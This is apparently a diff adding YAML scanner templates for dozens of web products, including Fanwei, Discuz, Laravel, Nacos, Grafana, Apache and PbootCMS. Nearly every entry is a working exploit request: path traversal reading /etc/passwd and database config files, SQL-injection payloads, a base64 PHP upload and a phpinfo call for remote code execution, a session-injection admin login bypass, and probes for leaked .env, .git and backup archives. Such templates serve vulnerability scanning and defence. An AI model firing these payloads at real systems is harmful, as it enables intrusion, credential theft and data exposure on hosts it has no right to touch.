+    name: "Eyoucms 远程代码执行漏洞"
+    requests:
+      - method: "POST"
+        path: "/index.php/api/Uploadify/preview"
+        body: 'data:image/php;base64,PD9waHAgcGhwaW5mbygpOw=='
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "jsonrpc"
+            condition: "or"
+
+  - id: "fanwei-db-info"
+    name: "Fanwei数据库信息泄露漏洞"
+    requests:
+      - method: "GET"
+        path: '/mysql_config.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "datauser"
+            condition: "or"
+
+  - id: "fanwei-jx2-config"
+    name: "Fanwei JX2配置文件泄露"
+    requests:
+      - method: "GET"
+        path: '/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "sdbuser"
+            condition: "or"
+
+  - id: "fanwei-file-read-1"
+    name: "Fanwei文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "datauser"
+              - "datapassword"
+              - "dataname"
+            condition: "and"
+
+  - id: "fanwei-file-read-2"
+    name: "Fanwei PHP文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../iweboffice/officeserver.php'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "<?php"
+            condition: "or"
+
+  - id: "fanwei-jsp-file-read"
+    name: "Fanwei JSP文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../../../login/login.jsp'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '<%@'
+              - '<?php'
+            condition: "and"
+  - id: "fanwei-portal-file-read"
+    name: "Fanwei门户文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '<%@'
+              - '<?php'
+            condition: "and"
+
+  - id: "jindieeas-file-read"
+    name: "Jindieeas文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/Win.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'for 16-bit app support'
+            condition: "or"
+
+  - id: "jumpserver-info-leak"
+    name: "Jumpserver信息泄露漏洞"
+    requests:
+      - method: "GET"
+        path: '/api/v1/terminal/sessions/'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'account_id'
+            condition: "or"
+
+  - id: "knightcms-info-leak"
+    name: "KnightCMS信息泄露漏洞"
+    requests:
+      - method: "GET"
+        path: '/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and extractvalue(1,concat(0x7e,md5(99999999))) -- a'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "ef775988943825d2871e1cfa75473ec"
+            condition: "or"
+
+  - id: "laravel-cve-2024-29291"
+    name: "Laravel CVE-2024-29291漏洞"
+    requests:
+      - method: "GET"
+        path: "/storage/logs/laravel.log"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'PDO->__construct'
+            condition: "or"
+
+  - id: "laravel-env-leak"
+    name: "Laravel环境文件泄露"
+    requests:
+      - method: "GET"
+        path: '/.env'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'DB_HOST'
+              - 'REDIS_'
+            condition: "or"
+
+  - id: "nginx-openresty-file-read"
+    name: "Nginx/OpenResty文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/rewrite?x=/../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "bc-file-read"
+    name: "BC系统文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/msg/jpush/getUserTagNames/..;/..;/env'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'jdbc:mysql://'
+            condition: "or"
+
+  - id: "discuz-ssrf"
+    name: "Discuz SSRF漏洞"
+    requests:
+      - method: "GET"
+        path: '/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://dns/1.jpg[/img]'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'parent.updateDownImageList'
+            condition: "or"
+
+  - id: "discuz-sql-vuln-1"
+    name: "Discuz SQL注入漏洞(1)"
+    requests:
+      - method: "GET"
+        path: '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'MySQL Query Error'
+            condition: "or"
+
+  - id: "discuz-sql-vuln-2"
+    name: "Discuz SQL注入漏洞(2)"
+    requests:
+      - method: "GET"
+        path: '/faq.php?action=grouppermission&gids[80]=%27&gids[81][0]=)%20and%20updatexml(1,concat(0x7e,(select%20@@version)),1)%23'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'MySQL Query Error'
+            condition: "or"
+
+  - id: "laravel-thinksns-fileread"
+    name: "Laravel/ThinkSNS文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/gpt/pictureproxy.php?url=/www/wwwroot/sxxp/web/bootstrap/cache/config.php'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'file_get_contents'
+              - 'Failed to open stream'
+            condition: "or"
+
+  - id: "laravel-template-read"
+    name: "Laravel模板文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/index.php?a=display&templateFile=README.md'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '## README'
+            condition: "or"
+
+  - id: "bc-userinfo-leak"
+    name: "BC系统用户信息泄露"
+    requests:
+      - method: "GET"
+        path: '/club/server/getClubAllUsers'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "pwd"
+              - "loginName"
+              - "createdBy"
+            condition: "and"
+
+  - id: "crmeb-sql-vuln-3"
+    name: "Crmeb SQL注入漏洞(3)"
+    requests:
+      - method: "GET"
+        path: '/api/products?keyword=11&limit=8&news=0&page=1&priceOrder=&salesOrder=&sid=extractvalue(1,concat(char(126),md5(1700839030)))'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+
+  - id: "web-error-info"
+    name: "Web系统错误信息泄露"
+    requests:
+      - method: "GET"
+        path: '/?s=&*^(AS*&CGBSLJCLSAJKH3q7e8=-0'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "系统出现异常"
+              - "系统发生异常"
+              - "系统异常"
+              - "控制器不存在"
+              - '/www/wwwroot'
+            condition: "or"
+
+  - id: "spring-actuator-leak"
+    name: "Spring Actuator信息泄露"
+    requests:
+      - method: "GET"
+        path: "/prod-api/actuator"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "actuator/env"
+              - "actuator/info"
+              - "actuator/health"
+            condition: "or"
+  - id: "spring-actuator-leak-2"
+    name: "Spring Actuator信息泄露(路径穿越)"
+    requests:
+      - method: "GET"
+        path: '/..;/actuator'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "actuator/env"
+              - "actuator/info"
+              - "actuator/health"
+            condition: "or"
+
+  - id: "vue3-file-read-1"
+    name: "Vue3文件读取漏洞(Linux)"
+    requests:
+      - method: "GET"
+        path: '/etc/passwd?raw'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '/root:/bin/bash'
+            condition: "or"
+
+  - id: "vue3-file-read-2"
+    name: "Vue3文件读取漏洞(带@fs)"
+    requests:
+      - method: "GET"
+        path: '/@fs/etc/passwd?import&raw??'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '/root:/bin/bash'
+            condition: "or"
+
+  - id: "vue3-file-read-3"
+    name: "Vue3文件读取漏洞(Windows)"
+    requests:
+      - method: "GET"
+        path: '/@fs/C://windows/win.ini?import&raw??'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'for 16-bit app support'
+            condition: "or"
+
+  - id: "nexus-file-read"
+    name: "Nexus文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "apache-cve-2021-41733"
+    name: "Apache HTTP Server CVE-2021-41773漏洞"
+    requests:
+      - method: "GET"
+        path: '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "bazaar-cve-2024-40348"
+    name: "Bazaar v1.4.3 CVE-2024-40348文件读取"
+    requests:
+      - method: "GET"
+        path: '/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "alibaba-canal-info"
+    name: "阿里巴巴Canal配置信息泄露"
+    requests:
+      - method: "GET"
+        path: '/api/v1/canal/config/1/0'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "clusterId"
+              - "serverId"
+            condition: "and"
+
+  - id: "dataease-cve-2024-30269"
+    name: "DataEase CVE-2024-30269漏洞"
+    requests:
+      - method: "GET"
+        path: '/de2api/engine/getEngine;.js'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "catalogDesc"
+              - "configuration"
+            condition: "and"
+
+  - id: "easycvr-userinfo"
+    name: "EasyCVR用户信息泄露"
+    requests:
+      - method: "GET"
+        path: '/api/v1/userlist?pageindex=0&pagesize=10'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "Username"
+              - "Password"
+              - "RoleName"
+              - "RoleId"
+            condition: "and"
+
+  - id: "grafana-file-read"
+    name: "Grafana文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "jeevms-file-read"
+    name: "JEEVMS文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "joomla-cve-2023-23752"
+    name: "Joomla CVE-2023-23752信息泄露"
+    requests:
+      - method: "GET"
+        path: '/api/index.php/v1/config/application?public=true'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "attributes"
+              - "application"
+            condition: "and"
+
+  - id: "jumpserver-cve-2023-42442"
+    name: "JumpServer CVE-2023-42442漏洞"
+    requests:
+      - method: "GET"
+        path: '/api/v1/terminal/sessions/'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "user_id"
+              - "org_id"
+              - "account_id"
+            condition: "and"
+
+  - id: "nacos-cve-2021-29441"
+    name: "Nacos CVE-2021-29441用户信息泄露"
+    requests:
+      - method: "GET"
+        path: '/nacos/v1/auth/users?pageNo=1&pageSize=10'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "username"
+              - "password"
+              - "totalCount"
+            condition: "and"
+
+  - id: "yzmcms-rce"
+    name: "YzmCMS pay_callback远程代码执行"
+    requests:
+      - method: "POST"
+        path: '/pay/index/pay_callback.html'
+        body: 'out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'PHP Version'
+              - 'Loaded plugins'
+            condition: "or"
+
+  - id: "emlog-sql-vuln"
+    name: "EMLog SQL注入漏洞"
+    requests:
+      - method: "GET"
+        path: '/index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)%20%20--%2520'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'XPATH syntax error'
+              - "Syntax error"
+            condition: "or"
+
+  - id: "smart-admin-info"
+    name: "Smart Admin信息泄露漏洞"
+    requests:
+      - method: "GET"
+        path: '/employee/queryAll'
+        headers:
+          X-Access-Token: "1"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "employeeId"
+              - "loginName"
+              - "actualName"
+            condition: "and"
+
+  - id: "jfinalcms-file-read"
+    name: "JFinalCms文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/common/file/download?fileKey=../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+  - id: "web-file-info"
+    name: "Web源码泄露"
+    requests:
+      - method: "GET"
+        path: '/html.tar'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/web.tar'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/.git/HEAD'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'ref: refs/heads/master'
+              - 'ref: refs/heads/main'
+            condition: "or"
+      - method: "GET"
+        path: '/web.tar'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/web.zip'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/backup.tar'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/old.zip'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/backup.zip'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/new.zip'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+  - id: "web-api-info"
+    name: "Web接口泄露"
+    requests:
+      - method: "GET"
+        path: '/swagger-resources'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'swaggerVersion'
+            condition: "or"
+      - method: "GET"
+        path: '/swagger-ui/index.html'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'swagger-ui.css'
+            condition: "or"
+      - method: "GET"
+        path: '/doc.html'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'swagger-bootstrap-ui'
+              - 'swagger'
+            condition: "or"
+  - id: "ckfinder-info"
+    name: "ckfinder info"
+    requests:
+      - method: "GET"
+        path: '/ckfinder/ckfinder.html'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'ckfinder.js'
+            condition: "or"
+  - id: "pbootcms-databases-info"
+    name: "Pbootcms 数据库文件泄露"
+    requests:
+      - method: "GET"
+        path: '/data/pbootcms.db'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'SQLite format'
+              - 'PbootCMS'
+            condition: "and"
+  - id: "pbootcms-sql-vuln"
+    name: "Pbootcms SQL注入漏洞"
+    requests:
+      - method: "GET"
+        path: '/api.php/List/index?order=123%20and(updatexml(1,concat(0x7e,(select%20md5(1954))),1))%20%23'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '5a7f963e5e0504740c3a6b10bb6d4fa'
+            condition: "or"
+      - method: "POST"
+        path: '/index.php?p=search'
+        body: '1=select'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "syntax error"
+            condition: "or"
+  - id: "gitea-info"
+    name: "Gitea 用户信息"
+    requests:
+      - method: "GET"
+        path: '/explore/users'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'Gitea'
+              - 'explore/users'
+              - 'explore/repos'
+            condition: "and"
+  - id: "football-web-vuln"
+    name: "BC web SQLi"
+    requests:
+      - method: "GET"
+        path: '/information/detail.html?id='''
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+  - id: "laike-vuln"
+    name: "来客PHP登录绕过"
+    requests:
+      - method: "GET"
+        path: '/install.php?_SESSION[Msg][service_id]=1&_SESSION[Msg][user_name]=&_SESSION[Msg][nick_name]=&_SESSION[Msg][password]=&_SESSION[Msg][groupid]=&_SESSION[Msg][phone]=&_SESSION[Msg][open_id]=&_SESSION[Msg][email]=&_SESSION[Msg][business_id]=1&_SESSION[Msg][avatar]=&_SESSION[Msg][level]=super_manager&_SESSION[Msg][parent_id]=&_SESSION[Msg][offline_first]=&_SESSION[Msg][state]=online&_SESSION[Msg][business][business_name]='
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '安装向导'
+              - '已经安装成功'
+            condition: "and"
